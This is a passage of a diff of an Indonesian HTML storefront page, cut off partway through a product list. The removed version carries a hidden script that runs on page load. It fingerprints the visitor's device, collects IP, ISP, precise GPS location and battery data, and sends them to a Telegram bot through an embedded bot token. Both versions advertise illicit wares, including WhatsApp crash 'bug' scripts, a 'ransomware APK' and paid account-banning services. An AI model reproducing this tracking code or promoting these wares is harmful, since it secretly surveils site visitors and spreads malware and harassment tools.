@@ -1,609 +1,711 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Pembayaran Premium</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-
-    body {
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #1f1c2c, #928dab);
-      color: #fff;
-      text-align: center;
-      padding: 30px 10px;
-      margin: 0;
-    }
-
-    h1 {
-      font-size: 2.2em;
-      margin-bottom: 5px;
-    }
-
-    p {
-      font-size: 1.1em;
-      margin-bottom: 20px;
-      color: #f5f5f5;
-    }
-
-    img.anime {
-      width: 300px;
-      border-radius: 15px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-      margin-bottom: 25px;
-    }
-
-    .btn {
-      display: block;
-      width: 85%;
-      max-width: 300px;
-      margin: 12px auto;
-      padding: 14px;
-      font-size: 16px;
-      font-weight: bold;
-      border: none;
-      border-radius: 14px;
-      cursor: pointer;
-      transition: 0.3s;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-    }
-
-    .bayar { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
-    .menu  { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
-    .cs    { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
-    .telegram { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
-    .owner { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
-    .music { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
-    .WhatsApp { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
-
-    .btn:hover { opacity: 0.9; }
-
-    footer {
-      margin-top: 30px;
-      font-size: 0.9em;
-      color: #ccc;
-    }
-
-    .popup {
-      display: none;
-      background-color: rgba(0,0,0,0.85);
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      z-index: 999;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .popup-content {
-      background-color: #2c3e50;
-      padding: 20px;
-      border-radius: 15px;
-      width: 90%;
-      max-width: 420px;
-      text-align: left;
-      color: white;
-      overflow-y: auto;
-      max-height: 80vh;
-    }
-
-    .popup-content h2 {
-      margin-top: 0;
-      color: #f39c12;
-    }
-
-    .close-btn {
-      background: crimson;
-      color: white;
-      padding: 8px 15px;
-      margin-top: 15px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-
-    .identitas img {
-      width: 100px;
-      border-radius: 50%;
-      margin: 10px auto;
-      display: block;
-    }
-
-    .identitas h3 {
-      text-align: center;
-      color: #00e6b8;
-    }
-
-    .identitas p {
-      font-size: 0.95em;
-      text-align: justify;
-    }
-
-    .titik-tiga {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      font-size: 28px;
-      color: white;
-      cursor: pointer;
-      z-index: 1000;
-      user-select: none;
-      font-weight: bold;
-      background: rgba(255,255,255,0.1);
-      padding: 8px 12px;
-      border-radius: 10px;
-      backdrop-filter: blur(6px);
-      transition: background 0.3s ease;
-    }
-
-    .titik-tiga:hover {
-      background: rgba(255,255,255,0.2);
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MURID STORE - Jasa Digital & Tools Premium</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #4a00e0;
+            --secondary: #8e2de2;
+            --accent: #00c6ff;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --success: #28a745;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: var(--dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            padding-bottom: 2rem;
+        }
+        
+        header {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            padding: 1.5rem 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo i {
+            margin-right: 10px;
+            color: var(--accent);
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+        }
+        
+        nav ul li {
+            margin-left: 1.5rem;
+        }
+        
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+            padding: 0.5rem;
+            border-radius: 4px;
+        }
+        
+        nav ul li a:hover {
+            color: var(--accent);
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .hero {
+            padding: 4rem 0;
+            text-align: center;
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('https://images.unsplash.com/photo-1516387938699-a93567ec168e?ixlib=rb-4.0.3') center/cover;
+            color: white;
+            border-radius: 0 0 20px 20px;
+            margin-bottom: 2rem;
+        }
+        
+        .hero h1 {
+            font-size: 2.8rem;
+            margin-bottom: 1rem;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 2rem;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: var(--accent);
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 198, 255, 0.3);
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 198, 255, 0.4);
+        }
+        
+        .btn-primary {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            box-shadow: 0 4px 15px rgba(138, 43, 226, 0.3);
+        }
+        
+        .btn-primary:hover {
+            box-shadow: 0 6px 20px rgba(138, 43, 226, 0.4);
+        }
+        
+        .categories {
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+        
+        .categories h2 {
+            font-size: 2rem;
+            margin-bottom: 1.5rem;
+            color: var(--primary);
+        }
+        
+        .category-buttons {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        
+        .category-btn {
+            background: white;
+            border: 2px solid var(--primary);
+            color: var(--primary);
+            padding: 0.6rem 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 500;
+        }
+        
+        .category-btn:hover, .category-btn.active {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .products {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+        
+        .product-card {
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .product-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .product-image {
+            height: 180px;
+            background: linear-gradient(45deg, #6a11cb 0%, #2575fc 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 3rem;
+        }
+        
+        .product-info {
+            padding: 1.5rem;
+        }
+        
+        .product-info h3 {
+            font-size: 1.3rem;
+            margin-bottom: 0.5rem;
+            color: var(--dark);
+        }
+        
+        .product-info p {
+            color: #666;
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
+        }
+        
+        .product-price {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+        
+        .buy-btn {
+            width: 100%;
+            padding: 0.8rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .buy-btn:hover {
+            background: var(--secondary);
+        }
+        
+        .payment-section {
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+        
+        .payment-section h2 {
+            color: var(--primary);
+            margin-bottom: 1.5rem;
+            font-size: 1.8rem;
+        }
+        
+        .payment-options {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+        
+        .payment-method {
+            background: var(--light);
+            padding: 1.5rem;
+            border-radius: 10px;
+            width: 280px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
+        }
+        
+        .payment-method h3 {
+            margin-bottom: 1rem;
+            color: var(--dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+        
+        .qris-code {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 1rem;
+            background: white;
+            padding: 10px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        .qris-code img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        
+        .dana-info {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1rem;
+        }
+        
+        .dana-logo {
+            font-size: 3rem;
+            color: var(--primary);
+        }
+        
+        .dana-number {
+            font-size: 1.2rem;
+            font-weight: 600;
+            background: var(--light);
+            padding: 0.5rem 1.5rem;
+            border-radius: 50px;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 2rem 0;
+            color: #666;
+            font-size: 0.9rem;
+        }
+        
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            
+            nav ul {
+                gap: 0.5rem;
+                justify-content: center;
+            }
+            
+            nav ul li {
+                margin: 0 0.5rem;
+            }
+            
+            .hero h1 {
+                font-size: 2.2rem;
+            }
+            
+            .products {
+                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            }
+            
+            .payment-options {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+    </style>
 </head>
 <body>
-
-<style>
-            body {
-                min-height: 100vh;
-                background: linear-gradient(130deg, #09090b 0%, #45020c 100%);
-                font-family: "Segoe UI", sans-serif;
-            }
-            .glow {
-                box-shadow:
-                    0 0 32px 6px #b91c1c99,
-                    0 0 2px #fff;
-                border: 2.5px solid #b91c1c;
-                animation: pulse 2.5s infinite;
-            }
-            .neon-text {
-                color: #f87171;
-                text-shadow:
-                    0 0 10px #b91c1c,
-                    0 0 20px #b91c1c,
-                    0 0 30px #b91c1c,
-                    0 0 40px #b91c1c90,
-                    0 0 70px #b91c1c80;
-                letter-spacing: 2px;
-                animation: neonflicker 3s infinite alternate;
-            }
-            @keyframes pulse {
-                0%,
-                100% {
-                    box-shadow:
-                        0 0 32px 8px #b91c1c66,
-                        0 0 2px #fff;
-                }
-                50% {
-                    box-shadow:
-                        0 0 64px 12px #f87171cc,
-                        0 0 12px #fff;
-                }
-            }
-            @keyframes neonflicker {
-                0%,
-                100% {
-                    opacity: 1;
-                    filter: brightness(1);
-                }
-                70% {
-                    opacity: 0.93;
-                    filter: brightness(1.2);
-                }
-                85% {
-                    opacity: 0.7;
-                    filter: brightness(1.5);
-                }
-            }
-            .paycard {
-                background: rgba(18, 16, 18, 0.93);
-                border-radius: 1.7rem;
-                box-shadow: 0 2px 40px #b91c1c30;
-                transition:
-                    transform 0.14s,
-                    box-shadow 0.14s;
-            }
-            .paycard:hover {
-                transform: translateY(-8px) scale(1.03);
-                box-shadow:
-                    0 8px 60px #fa223499,
-                    0 0 24px #fa223455;
-            }
-            .qrbox {
-                background: linear-gradient(135deg, #1e1b20 60%, #333 100%);
-                padding: 1.2rem;
-                border-radius: 1.2rem;
-                box-shadow: 0 0 22px #2227;
-            }
-            .btn-tg {
-                background: linear-gradient(90deg, #b91c1c, #f87171);
-                color: #fff;
-                border-radius: 999px;
-                font-weight: 600;
-                padding: 0.75rem 2rem;
-                box-shadow: 0 2px 24px #b91c1c45;
-                transition:
-                    background 0.18s,
-                    box-shadow 0.18s,
-                    transform 0.18s;
-                border: none;
-                display: inline-flex;
-                align-items: center;
-                gap: 0.6em;
-                font-size: 1rem;
-                margin-top: 2.5rem;
-                cursor: pointer;
-                letter-spacing: 0.5px;
-                outline: none;
-            }
-            .btn-tg:hover {
-                background: linear-gradient(90deg, #d71c1c, #f43f5e);
-                box-shadow: 0 6px 32px #fa223485;
-                transform: scale(1.05) translateY(-2px);
-                text-decoration: none;
-                color: #fff;
-            }
-            .btn-tg svg {
-                width: 22px;
-                height: 22px;
-                margin-right: 0.25em;
-                vertical-align: middle;
-                fill: #fff;
-            }
-            .copy-btn {
-                background: #18181b;
-                border: 1.2px solid #f87171;
-                color: #fff;
-                padding: 0.45rem 1.2rem;
-                border-radius: 999px;
-                margin-top: 1em;
-                cursor: pointer;
-                font-size: 0.98em;
-                font-weight: 500;
-                transition:
-                    background 0.13s,
-                    border 0.13s;
-            }
-            .copy-btn:hover {
-                background: #f87171;
-                border: 1.5px solid #fff;
-                color: #fff;
-            }
-            /* List jualan */
-            .list-jualan {
-                background: #18181b;
-                border-radius: 1.5rem;
-                box-shadow: 0 2px 32px #fa223420;
-                padding: 2rem 1.5rem;
-                margin-bottom: 2.5rem;
-                width: 100%;
-                max-width: 470px;
-            }
-            .list-jualan h2 {
-                color: #f87171;
-                text-shadow: 0 0 12px #b91c1c77;
-                font-size: 1.3rem;
-                font-weight: bold;
-                margin-bottom: 1rem;
-                letter-spacing: 1px;
-                text-align: center;
-            }
-            .list-jualan ul {
-                padding-left: 1.1rem;
-            }
-            .list-jualan li {
-                color: #fff;
-                font-size: 1.06rem;
-                margin-bottom: 0.7em;
-                border-left: 3px solid #fa2234;
-                padding-left: 0.7em;
-                line-height: 1.5;
-                background: #24242455;
-                border-radius: 0.3em;
-                transition: background 0.2s;
-            }
-            .list-jualan li:hover {
-                background: #b91c1c22;
-            }
-        </style>
-
-  <!-- TITIK TIGA MENU -->
-  <div class="titik-tiga" onclick="showPopup('popupMenuTiga')">⋮</div>
-
-  <h1>💫 SEMUA BARANG TERSEDIA DI BAWAH </h1>
-  <p>Silahkan pilih  Barang berkualitas Di Bawah Ini!</p>
-
-  <img src="https://files.catbox.moe/gwnw0u.jpg" class="anime w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" alt="Anime Girl">
-
-  <button class="btn bayar w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="showPopup('popupBayar')">💰 Bayar Sekarang</button>
-  <button class="btn menu w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="showPopup('popupMenu')">📋 Menu Lainnya</button>
-  <button class="btn cs w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="hubungiCS()">📩 Hubungi CS</button>
-    <button class="btn telegram w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="hubungiTelegram()">💬 Contact via Telegram</button> 
-  <button class="btn owner w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="showPopup('t.me/wan4nz')"Tentang Owner</button>
-  <button class="btn music w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="toggleYouTube()">🎵 Play Music</button>
-      <button class="btn WhatsApp w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="hubungiWhatsapp()">💬 Contact Owner</button> 
-
-  <!-- saluran testi wannz -->
-  <iframe id="testi"
-    width="320"
-    height="180"
-    src="https://files.catbox.moe/byomk1.jpg"
-    frameborder="0"
-    allow="onclik"
-    allowfullscreen
-    style="border-radius:15px; margin-top:20px;">
-  </iframe>
-
-  <h3>
-    &copy; 2025 ObyMoods Website Payment
-  </h3>
-
-  <!-- POPUP: Bayar -->
-  <div class="popup" id="popupBayar">
-    <div class="popup-content w-24 mt-12 mb-5 rounded-2xl shadow-lg glow">
-      <h2>🔐 Metode Pembayaran</h2>
-      <p class="text-lg font-semibold text-[#02bde3] mb-3 tracking-wider neon-text"
-                    style="color: #02bde3; text-shadow: 0 0 14px #02bde3cc">𝐍𝐎 𝐃𝐀𝐍𝐀:</p>
-      <b>085880407394
-      ATAS NAMA: SANTI</b>
-      <button id="copy-btn" class="copy-btn" onclick="copyDana()">
-                    SALIN NOMOR DANA
-                </button>
-      <p class="text-lg font-semibold text-[#02bde3] mb-3 tracking-wider neon-text"
-                    style="color: #02bde3; text-shadow: 0 0 20px #02bde3cc">𝐀𝐓𝐀𝐔 𝐒𝐂𝐀𝐍 𝐐𝐑𝐈𝐒 𝐃𝐈 𝐁𝐀𝐖𝐀𝐇 𝐈𝐍𝐈:</p>
-      <img src="https://files.catbox.moe/4gxxe4.jpg" alt="QRIS" style="width:100%; border-radius:15px;">
-      <button class="close-btn" onclick="closePopup('popupBayar')" style="width:100%;">Tutup</button>
-    </div>
-  </div>
-
-  <!-- POPUP: Menu -->
-  <div class="popup" id="popupMenu">
-    <div class="popup-content w-24 mt-12 mb-5 rounded-2xl shadow-lg glow ">
-      <h2>🛍️ DAPTAR JUALAN WANZ</h2>
-      <ul>
-        <li>✅ SCRIPT BUG WA/TELE</li>
-        <li>✅ SCRIPT DESTROYED
-       ✅ SCRIPT ZENO 
-       ✅ SCRIPT ZOMBIE INVITY
-       ✅ SCRIPT RIMURU
-       ✅ SCRIPT NORTH STAR
-       ✅ SCRIPT DRAGON CRASH
-       ✅ SCRIPT XEROVANG
-       ✅ SCRIPT THREE BROTHERS 
-       ✅ SCRIPT DREADT INVICTUS
-       ✅ DLL
-       ✅ MENYEDIAKAN PANEL  </li>
-        <li>✅ PANEL UNLIMITED</li> <li>✅  RESELLER PANEL</li>
-        <li>✅ ADMIN PANEL
-           ✅ JASA MASANG SCRIPT BUG </li>
-        <li>✅ OWNER PANEL
-           ✅ JASA BUG
-           ✅ MURBUG VIIP (MURID BUG) </li>
-      </ul>
-      <button class="close-btn" onclick="closePopup('popupMenu')" style="width:100%;">Tutup</button>
-    </div>
-  </div>
-
-  <!-- POPUP: Owner -->
-  <div class="popup" 8147535653="wan4nz">
-    <div class="popup-content identitas w-24 mt-12 mb-5 rounded-2xl shadow-lg glow">
-      <h2>👑 Identitas Owner</h2>
-      <img src="https://files.catbox.moe/ru3o9a.jpg" alt="Owner">
-      <h3>ObyMoods</h3>
-      <p>
-        Seorang pengusaha muda dari Indonesia yang ingin  membuat kedua orang tuanya bahagia, dan pembayaran yang aman layanan premium berkulaitas tinggi..
-        <br><br>
-        Motto: <i>"Berjuang Tak Kenal Lelah, Tetap Kuat Untuk Sang Pembenci!!."</i>
-      </p>
-      <button class="close-btn" onclick="closePopup('popupOwner')" style="width:100%;">Tutup</button>
-    </div>
-  </div>
-
-  <!-- POPUP: Menu Titik Tiga -->
-  <div class="popup" id="popupMenuTiga">
-    <div class="w-24 mt-12 mb-5 rounded-2xl shadow-lg glow">
-      <h2>📌 Support & Fitur Tambahan</h2>
-      <p><b>📂 bangkit sendiri tanpa mengenal lelah:</b></p>
-      <ul>
-        <li>•  (wannz)</li>
-        <li>• O(wanzzz)</li>
-      </ul>
-      <hr>
-      <p><b>🧩 Fitur Lainnya:</b></p>
-      <ul>
-        <li>• Layanan Premium 24 Jam</li>
-        udah terjamin aman dan berkualitas 
-        <li>• Proteksi Anti-Ban</li>
-        <li>• Script WhatsApp MD</li>
-      </ul>
-      <button class="close-btn" onclick="closePopup('popupMenuTiga')" style="width:90%;">Tutup</button>
-    </div>
-  </div>
-  
-<body>
-  <script>
-    const BOT_TOKEN = "7992707767:AAGDgSbrxBGtKglDY-JAo2Z6tN_Xc0_DDJs";
-    const OWNER_CHAT_ID = "7466190629"; // <-- Ganti dengan chat ID owner bot (bukan grup)
-
-    async function generateFingerprint() {
-      const ua = navigator.userAgent;
-      const lang = navigator.language;
-      const res = screen.width + "x" + screen.height;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const ram = navigator.deviceMemory || "N/A";
-      const cpu = navigator.hardwareConcurrency || "N/A";
-
-      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
-      const encoder = new TextEncoder();
-      const data = encoder.encode(raw);
-      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
-    }
-
-    async function getVisitorInfo() {
-  const clock = new Date().toLocaleString();
-  let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
-  let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A", namaISP = "N/A";
-
-  const userAgent = navigator.userAgent;
-  const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
-  const device = navigator.platform + " - " + userAgent;
-  const loginFrom = navigator.platform || "N/A";
-  const language = navigator.language || "N/A";
-  const resolution = screen.width + "x" + screen.height;
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
-  const isOnline = navigator.onLine;
-  const deviceMemory = navigator.deviceMemory || "N/A";
-  const cpuCores = navigator.hardwareConcurrency || "N/A";
-  const isTouch = 'ontouchstart' in window;
-  const cookiesEnabled = navigator.cookieEnabled;
-  const doNotTrack = navigator.doNotTrack;
-  const fingerprint = await generateFingerprint();
-
-  // Battery info
-  const batteryInfo = await navigator.getBattery().then(battery => {
-    return {
-      "battery level": Math.round(battery.level * 100) + "%",
-      "charging": battery.charging ? "yes" : "no"
-    };
-  }).catch(() => ({
-    "battery level": "N/A",
-    "charging": "N/A"
-  }));
-
-  try {
-    const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
-    ip = ipData.ip;
-    country = ipData.country_name;
-    province = ipData.region;
-    latitude = ipData.latitude;
-    longitude = ipData.longitude;
-
-    // Ambil nama ISP dari IP menggunakan ipinfo.io
-    const whois = await fetch(`https://ipinfo.io/${ip}/json?token=123456789abcde`).then(r => r.json());
-    namaISP = whois.org || "N/A";
-  } catch {}
-
-  try {
-    const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
-    weather = weatherData.current_condition[0].weatherDesc[0].value;
-    temperature = weatherData.current_condition[0].temp_C + "°C";
-  } catch {}
-
-  try {
-    await new Promise((resolve) => {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          latitude = pos.coords.latitude.toFixed(6);
-          longitude = pos.coords.longitude.toFixed(6);
-          accuracy = pos.coords.accuracy + "m";
-          resolve();
-        },
-        () => resolve(),
-        { enableHighAccuracy: true, timeout: 5000 }
-      );
-    });
-  } catch {}
-
-  const jsonData = {
-    "nama": namaISP,
-    "alamat ip": ip,
-    "device": device,
-    "android versions": androidVersion,
-    "login from": loginFrom,
-    "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
-    "country": country,
-    "province": province,
-    "clock": clock,
-    "weather": weather,
-    "temperature": temperature,
-    "language": language,
-    "screen resolution": resolution,
-    "timezone": timezone,
-    "online": isOnline,
-    "ram (GB)": deviceMemory,
-    "cpu cores": cpuCores,
-    "touch support": isTouch,
-    "cookies enabled": cookiesEnabled,
-    "do not track": doNotTrack,
-    "fingerprint": fingerprint,
-    "battery": batteryInfo["battery level"],
-    "charging": batteryInfo["charging"]
-  };
-
-  const message = `📥 *New users*\n\`\`\`json\n${JSON.stringify(jsonData, null, 2)}\n\`\`\``;
-
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: OWNER_CHAT_ID,
-      text: message,
-      parse_mode: "Markdown"
-    })
-  });
-}
-
-    getVisitorInfo();
-  </script>
-</body>
-
-  <!-- JS -->
-  <script>
-    function showPopup(id) {
-      document.getElementById(id).style.display = "flex";
-    }
-
-    function closePopup(id) {
-      document.getElementById(id).style.display = "none";
-    }
-
-    function hubungiCS() {
-      window.location.href = "mailto:cs.aobi5198@gmail.com?subject=Bantuan Pembayaran&body=Halo admin, saya ingin tanya tentang pembayaran.";
-    }
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <i class="fas fa-store"></i>
+                    MURID STORE
+                </div>
+                <nav>
+                    <ul>
+                        <li><a href="#products">Produk</a></li>
+                        <li><a href="#payment">Pembayaran</a></li>
+                        <li><a href="#contact">Kontak</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </header>
     
-    function hubungiTelegram() {
-      window.open("https://t.me/wan4nz", "_blank");
-    }
+    <section class="hero">
+        <div class="container">
+            <h1>MURID STORE</h1>
+            <p>Jasa Digital & Tools Premium Terbaik dan Terpercaya</p>
+            <a href="#products" class="btn">Lihat Produk</a>
+        </div>
+    </section>
     
-    function hubungiWhatsapp() {
-      window.open("https://wa.me/085880407394","_blank");
-    }
+    <div class="container">
+        <section class="categories">
+            <h2>Kategori Produk</h2>
+            <div class="category-buttons">
+                <button class="category-btn active" data-category="all">Semua Produk</button>
+                <button class="category-btn" data-category="murid">Murid Products</button>
+                <button class="category-btn" data-category="apk">APK</button>
+                <button class="category-btn" data-category="sc">Source Code</button>
+            </div>
+        </section>
+        
+        <section id="products" class="products">
+            <!-- Produk akan ditampilkan di sini -->
+        </section>
+        
+        <section id="payment" class="payment-section">
+            <h2>Metode Pembayaran</h2>
+            <div class="payment-options">
+                <div class="payment-method">
+                    <h3><i class="fas fa-qrcode"></i> QRIS</h3>
+                    <div class="qris-code">
+                        <img src="https://files.catbox.moe/7yokm2.jpg" alt="QR Code Pembayaran QRIS">
+                    </div>
+                    <p>Scan QR code di atas untuk pembayaran via QRIS</p>
+                </div>
+                
+                <div class="payment-method">
+                    <h3><i class="fas fa-wallet"></i> DANA</h3>
+                    <div class="dana-info">
+                        <div class="dana-logo">
+                            <i class="fas fa-wallet"></i>
+                        </div>
+                        <div class="dana-number">085714353387</div>
+                        <p>Transfer ke nomor DANA di atas</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
     
-    function copyDana() {
-                const dana = "085880407394";
-                navigator.clipboard.writeText(dana);
-                const btn = document.getElementById("copy-btn");
-                btn.innerText = "Copied!";
-                setTimeout(() => (btn.innerText = "SALIN NOMOR DANA"), 1400);
+    <footer>
+        <div class="container">
+            <p>&copy; 2023 MURID STORE - All rights reserved</p>
+        </div>
+    </footer>
+
+    <script>
+        // Data produk
+        const products = [
+            { 
+                id: 1, 
+                name: "MURID UNBAND WHATSAPP", 
+                description: "Layanan unband WhatsApp premium", 
+                price: "Rp 50.000", 
+                category: "murid",
+                icon: "fab fa-whatsapp"
+            },
+            { 
+                id: 2, 
+                name: "MURID BAND WHATSAPP", 
+                description: "Layanan band WhatsApp berkualitas", 
+                price: "Rp 45.000", 
+                category: "murid",
+                icon: "fab fa-whatsapp"
+            },
+            { 
+                id: 3, 
+                name: "MURID BAND TIKTOK", 
+                description: "Layanan band TikTok terpercaya", 
+                price: "Rp 55.000", 
+                category: "murid",
+                icon: "fab fa-tiktok"
+            },
+            { 
+                id: 4, 
+                name: "MURID UNBAND TELEGRAM", 
+                description: "Layanan unband Telegram premium", 
+                price: "Rp 60.000", 
+                category: "murid",
+                icon: "fab fa-telegram"
+            },
+            { 
+                id: 5, 
+                name: "MURID BAND TELEGRAM", 
+                description: "Layanan band Telegram terpercaya", 
+                price: "Rp 55.000", 
+                category: "murid",
+                icon: "fab fa-telegram"
+            },
+            { 
+                id: 6, 
+                name: "MURID NOKOS", 
+                description: "Layanan NOKOS berkualitas tinggi", 
+                price: "Rp 65.000", 
+                category: "murid",
+                icon: "fas fa-phone"
+            },
+            { 
+                id: 7, 
+                name: "MURID SUNTIK ALL SOSMED", 
+                description: "Layanan suntik semua sosial media", 
+                price: "Rp 75.000", 
+                category: "murid",
+                icon: "fas fa-syringe"
+            },
+            { 
+                id: 8, 
+                name: "MURID LOGO", 
+                description: "Jasa pembuatan logo profesional", 
+                price: "Rp 100.000", 
+                category: "murid",
+                icon: "fas fa-paint-brush"
+            },
+            { 
+                id: 9, 
+                name: "MURID UP PAYMENT", 
+                description: "Layanan upgrade payment gateway", 
+                price: "Rp 85.000", 
+                category: "murid",
+                icon: "fas fa-credit-card"
+            },
+            { 
+                id: 10, 
+                name: "MURID RENAME APK", 
+                description: "Jasa rename APK profesional", 
+                price: "Rp 70.000", 
+                category: "murid",
+                icon: "fas fa-mobile"
+            },
+            { 
+                id: 11, 
+                name: "APK RANSOMWARE", 
+                description: "Aplikasi ransomware premium", 
+                price: "Rp 150.000", 
+                category: "apk",
+                icon: "fas fa-lock"
+            },
+            { 
+                id: 12, 
+                name: "SC JASEB", 
+                description: "Source code JASEB lengkap", 
+                price: "Rp 200.000", 
+                category: "sc",
+                icon: "fas fa-code"
+            },
+            { 
+                id: 13, 
+                name: "SC JASHER", 
+                description: "Source code JASHER terbaru", 
+                price: "Rp 180.000", 
+                category: "sc",
+                icon: "fas fa-code"
+            },
+            { 
+                id: 14, 
+                name: "SC CPANEL", 
+                description: "Source code CPanel premium", 
+                price: "Rp 220.000", 
+                category: "sc",
+                icon: "fas fa-server"
+            },
+            { 
+                id: 15, 
+                name: "SC UBOT(VIA PANEL)", 
+                description: "Source code UBot dengan panel", 
+                price: "Rp 250.000", 
+                category: "sc",
+                icon: "fas fa-robot"
+            },
+            { 
+                id: 16, 
